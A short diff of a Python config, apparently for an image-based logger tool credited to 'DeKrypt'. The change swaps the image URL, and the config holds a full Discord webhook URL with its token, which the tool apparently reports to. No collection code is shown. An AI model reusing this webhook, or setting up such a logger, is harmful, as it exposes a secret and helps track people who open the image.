@@ -10,7 +10,7 @@ __author__ = "DeKrypt"
 config = {
 
     "webhook": "https://discord.com/api/webhooks/1343686185448640553/rzowE7LMsRzHOGoN7uO1ktVkIqrkVezG2b_zsRI_kYra4JyyJildSulHQhZZ_cnvz7af",
-    "image": "https://cdn.discordapp.com/attachments/1278714725370167357/1344766429370515587/24ab34838fc0f90c.jpg", 
+    "image": "https://s6.uupload.ir/files/24ab34838fc0f90c_q5b6.jpg", 
                                                
     "imageArgument": True, 
 
